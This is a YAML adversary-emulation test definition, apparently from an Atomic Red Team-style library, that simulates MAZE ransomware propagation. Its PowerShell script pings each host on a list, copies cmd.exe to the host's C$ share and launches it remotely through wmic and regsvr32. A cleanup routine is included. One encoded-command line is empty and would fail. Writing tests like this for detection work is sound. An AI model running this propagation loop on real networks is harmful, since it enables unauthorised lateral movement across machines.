- id: 3e7b7d6c-7cd7-524f-a8d6-74657e52ee79
  name: Soumaia ART Tests - MAZE Propagation Script
  description: "This test simulates MAZE ransomware's propogation script that searches through a list of computers, tests connectivity to them, and copies a binary file to the Windows\\Temp directory of each one. \nUpon successful execution, a specified binary file will attempt to be copied to each online machine, a list of the online machines, as well as a list of offline machines will be output to a specified location.\nReference: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html"
  tactic: command-and-control
  technique:
    attack_id: T1105
    name: Ingress Tool Transfer
  platforms:
    windows:
      psh:
        command: "powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACQAZQBuAHYAOgBjAG8AbQBzAHAAZQBjACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA\nif ($LASTEXITCODE -ne 0) {\n    powershell -NoProfile -EncodedCommand dwByAGkAdABlAC0AaABvAHMAdAAgACIAVABoAGUAIABiAGkAbgBhAHIAeQBfAGYAaQBsAGUAIABpAG4AcAB1AHQAIABwAGEAcgBhAG0AZQB0AGUAcgAgAG0AdQBzAHQAIABiAGUAIABzAGUAdAAgAHQAbwAgAGEAIABiAGkAbgBhAHIAeQAgAHQAaABhAHQAIABlAHgAaQBzAHQAcwAgAG8AbgAgAHQAaABpAHMAIABjAG8AbQBwAHUAdABlAHIALgAiAAoA\n}\npowershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABUADEAMQAwADUATQBhAGMAaABpAG4AZQBMAGkAcwB0AC4AdAB4AHQAIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==\nif ($LASTEXITCODE -ne 0) {\n    powershell -NoProfile -EncodedCommand \n}\n$machine_list = \"$env:TEMP\\ART-ExternalPayloads\\T1105MachineList.txt\"\n$offline_list = \"$env:TEMP\\ART-ExternalPayloads\\T1105OfflineHosts.txt\"\n$completed_list = \"$env:TEMP\\ART-ExternalPayloads\\T1105CompletedHosts.txt\"\nforeach ($machine in get-content -path \"$machine_list\")\n{if (test-connection -Count 1 -computername $machine -quiet) \n{cmd /c copy \"$env:comspec\" \"\\\\$machine\\C$\\Windows\\Temp\\T1105.exe\"\necho $machine >> \"$completed_list\"\nwmic /node: \"$machine\" process call create \"regsvr32.exe /i C:\\Windows\\Temp\\T1105.exe\"}\nelse\n{echo $machine >> \"$offline_list\"}}"
        cleanup: "if (test-path \"$env:TEMP\\ART-ExternalPayloads\\T1105CompletedHosts.txt\") \n{foreach ($machine in get-content -path \"$env:TEMP\\ART-ExternalPayloads\\T1105CompletedHosts.txt\")\n{wmic /node: \"$machine\" process where name='\"regsvr32.exe\"' call terminate | out-null\nRemove-Item -path \"\\\\$machine\\C$\\Windows\\Temp\\T1105.exe\" -force -erroraction silentlycontinue}}\nRemove-Item -path \"$env:TEMP\\ART-ExternalPayloads\\T1105OfflineHosts.txt\" -erroraction silentlycontinue\nRemove-item -path \"$env:TEMP\\ART-ExternalPayloads\\T1105CompletedHosts.txt\" -erroraction silentlycontinue"
